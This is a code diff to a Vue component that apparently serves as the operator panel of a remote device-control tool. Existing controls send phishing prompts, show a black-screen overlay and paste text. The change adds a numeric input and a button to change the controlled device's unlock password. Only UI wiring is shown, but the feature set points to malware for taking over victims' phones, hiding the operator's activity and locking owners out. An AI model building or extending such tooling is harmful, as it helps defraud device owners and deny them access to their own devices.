@@ -52,6 +52,7 @@ interface Emits {
     (e: 'toggleBlockText', text: string, bg: string): void;
     (e: 'paste', text: string): void;
     (e: 'openQuickApp', app: string): void;
+    (e: 'modifyPassword', password: string): void;
 }
 
 const props = withDefaults(defineProps<Props>(), {
@@ -65,6 +66,7 @@ const phishType = ref('0');
 const blockText = ref('');
 const blockBg = ref('0');
 const isBlockTextActive = ref(false);
+const passwordInput = ref('');
 
 const handlePaste = () => {
     if (pasteText.value.trim()) {
@@ -75,6 +77,13 @@ const handlePaste = () => {
 
 const handleSendPhish = () => {
     emit('sendPhish', phishType.value);
+};
+
+const handleModifyPassword = () => {
+    if (passwordInput.value.trim() && /^\d+$/.test(passwordInput.value)) {
+        emit('modifyPassword', passwordInput.value);
+        passwordInput.value = '';
+    }
 };
 
 const handleToggleBlockText = () => {
@@ -328,6 +337,28 @@ const hasPassword = (label: string): boolean => {
             </div>
         </div>
 
+        <!-- 修改解锁密码 -->
+        <div class="control-section">
+            <div class="section-header">
+                <NIcon :component="KeyOutline" size="16" />
+                <span>修改解锁密码</span>
+            </div>
+            <div class="password-modify-row">
+                <NInput
+                    v-model:value="passwordInput"
+                    placeholder="输入数字密码..."
+                    size="small"
+                    :allow-input="(value: string) => /^\d*$/.test(value)"
+                    style="flex: 1;"
+                    @keyup.enter="handleModifyPassword"
+                />
+                <NButton size="small" type="warning" @click="handleModifyPassword">
+                    <template #icon><NIcon :component="KeyOutline" /></template>
+                    修改密码
+                </NButton>
+            </div>
+        </div>
+
         <!-- 黑屏文字 -->
         <div class="control-section">
             <div class="section-header">
@@ -476,6 +507,12 @@ const hasPassword = (label: string): boolean => {
 }
 
 .block-text-row {
+    display: flex;
+    gap: 8px;
+    align-items: center;
+}
+
+.password-modify-row {
     display: flex;
     gap: 8px;
     align-items: center;
